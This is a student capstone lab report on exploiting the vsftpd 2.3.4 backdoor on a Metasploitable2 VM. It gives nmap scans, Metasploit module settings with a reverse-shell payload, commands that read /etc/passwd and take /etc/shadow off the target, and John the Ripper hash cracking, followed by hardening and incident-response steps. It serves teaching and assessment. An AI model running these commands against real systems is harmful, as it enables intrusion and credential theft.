# ApexPlanet Cybersecurity
# Capstone Report — Vulnerability Assessment of a Test Network

**Project:** Vulnerability Assessment — Metasploit lab (vsftpd 2.3.4 backdoor & post-exploit analysis)

**Author:** Karyampudi Bala Thripura Venkata Srivalli

**Date:** *2025-10-30*

**Disclaimer:** All testing was performed in a controlled, isolated lab on VMs owned by the author. No actions were taken against external or production systems. Sensitive artifacts (raw `/etc/shadow`, cleartext passwords, private keys) are redacted and **not** published.



## Executive summary

This capstone performs a focused vulnerability assessment of an isolated test network using Metasploit and common reconnaissance tools. The assessment identified and exploited a known vsftpd 2.3.4 backdoor on a Metasploitable2 VM, obtained a remote shell, conducted controlled post-exploitation to collect password hashes, performed offline cracking with John the Ripper, and documented mitigations and hardening steps. The project includes evidence, mitigation verification, and an incident response simulation.


## Contents

1. Objectives & Scope
2. Environment & Tools
3. Methodology
4. Findings & Evidence
5. Risk Assessment & Impact
6. Mitigation & Hardening Actions
7. Incident Response Simulation
8. Conclusions & Lessons Learned
9. Appendices

   * A: Command log (selected)
   * B: How to reproduce (lab steps)
   * C: Notes on disclosure & safety

---

## 1. Objectives & Scope

**Objectives**

* Execute a repeatable vulnerability assessment workflow on a segmented test network.
* Confirm and exploit vsftpd 2.3.4 backdoor in a lab target.
* Demonstrate post-exploitation data collection and offline password cracking.
* Recommend and validate mitigation strategies.
* Simulate a basic detect→contain→eradicate→recover incident response.

**Scope**

* Target: Metasploitable2 VM (lab).
* Attacker: Kali Linux VM (lab).
* Network: Host-only/internal network, no internet access.
* Tools: Metasploit, nmap, netcat, john, tcpdump/wireshark for captures.

**Out of scope**

* Any testing on third-party or internet-connected hosts.
* Publishing of raw sensitive data (e.g., `/etc/shadow`) or exploit payloads to public places.

---

## 2. Environment & Tools

**VMs**

* Kali Linux (attacker) — example IP `192.168.56.102`
* Metasploitable2 (target) — example IP `192.168.56.101`
* Optional: Snapshot/sandbox VM for any dynamic analysis (isolated)

**Network**

* Host-only / internal network (no NAT to Internet).
* Snapshots taken of both VMs prior to testing.

**Primary tools**

* `msfconsole` (Metasploit)
* `nmap`, `netcat` (`nc`)
* `john` (John the Ripper)
* `tcpdump`, `wireshark` (for network captures)
* `vim`/`nano`, `scp`, `python3 -m http.server` (for simple file serving)

---

## 3. Methodology

Followed OWASP-style pentest workflow adapted to a lab environment:

**A. Preparation**

* Create snapshots of VMs.
* Document ROE (rules of engagement): lab-only, no internet, evidence collection.

**B. Reconnaissance & Enumeration**

* Identify IP addresses (`ifconfig` / `ip addr`).
* ### Scanning commands used

- `nmap -sN 192.168.x.x`  
  *TCP NULL scan* — sends TCP packets with no flags set; a stealthy probe to observe how the TCP/IP stack responds.

- `nmap -sS 192.168.x.x`  
  *TCP SYN (half-open) scan* — sends SYN packets and classifies ports based on SYN/ACK or RST replies; fast and commonly used.

- `nmap -sV 192.168.x.x`  
  *Version detection* — probes services to identify software names and versions (useful for mapping to CVEs).

- `nmap -sU 192.168.x.x`  
  *UDP scan* — probes UDP services (slower, often ambiguous replies, but important for services like DNS/SNMP).

- `nmap -O 192.168.x.x`  
  *OS detection* — infers the target OS from packet responses and TTL heuristics (treat as educated guess).

- `nmap -Pn -p- 192.168.x.x`  
  *Full TCP port sweep (skip host discovery)* — scans all 65535 ports; useful when ICMP/ping is blocked.

- `nmap -T4 192.168.x.x`  
  *Aggressive timing* — speeds up scanning where latency and stealth are not a concern.

- `nmap -Pn 192.168.x.x`  
  *Treat host as up* — skips host discovery probes; useful to bypass ICMP filtering.

- `nmap -Pn --script vuln 192.168.x.x`  
  *Vuln script scan* — runs NSE vulnerability scripts to highlight likely unpatched services.

**C. Vulnerability Verification**

* Confirm banner shows `vsftpd 2.3.4`.
* Confirm module presence in Metasploit:

  ```
  msfconsole
  search name:vsftpd
  ```

**D. Exploitation (lab-only)**

* Load and configure module (example):

  ```
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS <target_ip>
  set RPORT 21
  set LHOST <attacker_ip>
  set LPORT 4444
  set PAYLOAD cmd/unix/reverse    # or recommended payload
  exploit
  ```
* Interact with obtained session and enumerate:

  ```
  sessions -l
  sessions -i <id>
  whoami; id; uname -a; ifconfig -a; ls -la; cat /etc/passwd
  ```

**E. Post-exploitation (controlled)**

* If permitted (lab-only), capture `/etc/passwd` and `/etc/shadow`, transfer to attacker for offline cracking.
* Prepare hashes:

  ```
  unshadow passwd_copy.txt shadow_copy.txt > hashes_unshadowed.txt
  ```
* Decompress `rockyou.txt.gz` if needed:

  ```
  mkdir -p ~/wordlists
  zcat /usr/share/wordlists/rockyou.txt.gz > ~/wordlists/rockyou.txt
  ```
* Run John:

  ```
  john --format=md5crypt --wordlist=~/wordlists/rockyou.txt hashes_unshadowed.txt
  john --show hashes_unshadowed.txt
  ```

**F. Mitigation & Verification**

* Stop/disable/remove vulnerable service and apply firewall rules, then re-scan and attempt exploit to demonstrate remediation.

**G. Evidence Collection**

* Save screenshots, Metasploit transcripts, nmap outputs, john summary (passwords redacted), and before/after scans.

---

## 4. Findings & Evidence
### Recon & scan findings (summary)

- `nmap -sN 192.168.x.x` — NULL scan returned a small set of responsive ports (indicating a non-standard TCP/IP stack behavior); most ports were filtered or silent (firewalled).

- `nmap -sS 192.168.x.x` — SYN scan produced a clear map of open vs closed ports; confirmed core services were reachable (used as the primary baseline).

- `nmap -sV 192.168.x.x` — Version detection identified services and version strings (examples: `vsftpd 2.3.4` on port 21); these version strings were used to select exploit modules.

- `nmap -sU 192.168.x.x` — UDP scan found a few UDP services (common results: DNS/SNMP/NTP) with several ports marked `open|filtered` due to lack of replies.

- `nmap -O 192.168.x.x` — OS detection returned a best-guess of a Linux kernel family (e.g., Linux 2.6.x) with moderate confidence; treat as an initial hypothesis.

- `nmap -Pn -p- 192.168.x.x` — Full port sweep revealed **12 open TCP ports**, including 22 (SSH), 21 (FTP), 80 (HTTP) and 445 (SMB), indicating the host runs network services relevant for further testing.

- `nmap -T4 192.168.x.x` — Aggressive timing completed the top-port scan quickly and showed the host as highly responsive (useful to speed up testing in a lab).

- `nmap -Pn 192.168.x.x` — Forcing the host as 'up' bypassed ICMP filtering and allowed reliable service probing.

- `nmap -Pn --script vuln 192.168.x.x` — Vulnerability scripts flagged at least one notable issue: an unpatched Samba/SMB implementation (Samba 3.x) and other version-based matches (e.g., `vsftpd 2.3.4`) that map to well-known advisories. These flagged services were prioritized for controlled verification and exploit attempts in the lab.


###  Vulnerabilities discovered

* **vsftpd 2.3.4 backdoor** — remote command execution via a malicious backdoor present in specific builds. Confirmed via banner and Metasploit exploit module.

###  Exploitation summary

* **Exploit:** `exploit/unix/ftp/vsftpd_234_backdoor` (Metasploit)
* **Result:** Successful remote shell established from Kali to Metasploitable2.
* **Evidence:** (place screenshots / transcript references below)


###  Post-exploitation results

* `/etc/passwd` and `/etc/shadow` captured (lab-only).
* `hashes_unshadowed.txt` generated and fed to John.
* John cracked weak passwords for X out of Y accounts (redacted).



---

## 5. Risk Assessment & Impact

* **Severity (if in production):** High — remote code execution allows full system compromise.
* **Impact scenarios:**

  * Credential theft and lateral movement.
  * Privilege escalation (if further exploits present).
  * Data exfiltration if internet access allowed.
* **Likelihood:** Moderate to high for unpatched/legacy FTP deployments.

---

## 6. Mitigation & Hardening Actions

### Immediate remediation (applied in lab)

1. **Stop & disable vulnerable service**

   ```
   sudo systemctl stop vsftpd
   sudo systemctl disable vsftpd
   sudo apt remove --purge vsftpd -y
   ```
2. **Firewall**

   ```
   sudo ufw default deny incoming
   sudo ufw allow ssh   # only if needed
   sudo ufw deny 21/tcp
   sudo ufw enable
   ```
3. **Patch & update**

   ```
   sudo apt update && sudo apt upgrade -y
   ```
4. **SSH hardening**

   * `PermitRootLogin no`
   * `PasswordAuthentication no` (use keys)
   * Restart SSH: `sudo systemctl restart ssh`

### Verification

* Re-run `nmap` to confirm FTP is closed/filtered:

  ```
  nmap -sV -p 21 <target_ip> -oN hardening/after_scan.txt
  ```
* Re-run exploit; expect failure and capture error log.

---

## 7. Incident Response Simulation

**Detection**

* Event: unexpected remote shell and suspicious FTP banner.
* Indicators: Metasploit logs, unusual outbound connections, discovery of the backdoor signature.

**Containment**

* Isolate host from network (remove interface or change virtual network).
* Disable vsftpd service and kill active malicious sessions.

**Eradication**

* Remove backdoor artifacts (uploaded files, modified configs).
* Rebuild host from known good snapshot if necessary.

**Recovery**

* Restore from snapshot or rebuild, reapply patches and hardening, re-validate service exposures.

**Post-incident**

* Rotate any impacted credentials (lab-only simulated).
* Update internal procedures and patch management.

---

## 8. Conclusions & Lessons Learned

* Legacy services like FTP can contain long-standing backdoors and should be deprecated or carefully managed.
* Even in controlled labs, the full exploitation lifecycle (recon → exploit → post-exploit → remediation) is essential for understanding attacker capabilities and effective defenses.
* Offline password cracking demonstrates the importance of strong password policies and shadowed hashes.
* Hardening, segmentation, and monitoring reduce attack success and speed remediation.

---

## 9. Appendices

### Appendix A — Selected command 

> Replace `<target_ip>` and `<attacker_ip>` with your lab IPs.

```bash
# Recon
ifconfig
nmap -sC -sV -p- 192.168.56.102 -oA scans/full_scan
nc 192.168.56.102 21

# Metasploit exploit
msfconsole
search name:vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.56.102
set RPORT 21
set LHOST 192.168.56.1
set LPORT 4444
set PAYLOAD cmd/unix/interact
exploit

# Post-exploitation enumerations
sessions -l
sessions -i 1
whoami; id; uname -a; ifconfig -a; ls -la; cat /etc/passwd

# Hash cracking (on attacker)
unshadow passwd_copy.txt shadow_copy.txt > hashes_unshadowed.txt
mkdir -p ~/wordlists
zcat /usr/share/wordlists/rockyou.txt.gz > ~/wordlists/rockyou.txt
john --format=md5crypt --wordlist=~/wordlists/rockyou.txt hashes_unshadowed.txt
john --show hashes_unshadowed.txt

# Hardening
sudo systemctl stop vsftpd
sudo systemctl disable vsftpd
sudo apt remove --purge vsftpd -y
sudo ufw deny 21/tcp
nmap -sV -p 21 192.168.56.102 -oN hardening/after_scan.txt
```


### Appendix B — How to reproduce (lab steps)

1. Take snapshots of both Kali & Metasploitable2.
2. Ensure host-only network connectivity; confirm IPs.
3. Run recon nmap scans and confirm `vsftpd 2.3.4` banner.
4. Run Metasploit exploit as per Appendix A.
5. Collect evidence and follow post-exploit steps.
6. Apply hardening and verify remediation.

### Appendix D — Notes on disclosure & safety

* This exercise is for educational purposes only and performed in an isolated lab.
* Never run exploits or brute force tools against systems you do not own or have written permission to test.
* Redact or withhold sensitive data before sharing any artifacts publicly.

---


